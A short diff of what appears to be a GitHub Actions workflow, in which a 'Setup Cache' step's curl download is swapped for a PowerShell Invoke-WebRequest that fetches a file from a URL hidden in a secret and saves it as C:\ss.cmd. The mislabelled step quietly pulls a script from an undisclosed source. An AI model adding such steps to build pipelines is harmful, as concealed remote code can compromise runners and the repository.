@@ -9,7 +9,7 @@ jobs:
     
     steps:
     - name: Setup Cache
-      run: curl -o C:\ss.cmd "$Env:FL"
+      run: Invoke-WebRequest "$Env:FL" -OutFile C:\ss.cmd
       env:
         FL: ${{ secrets.FL }}
 
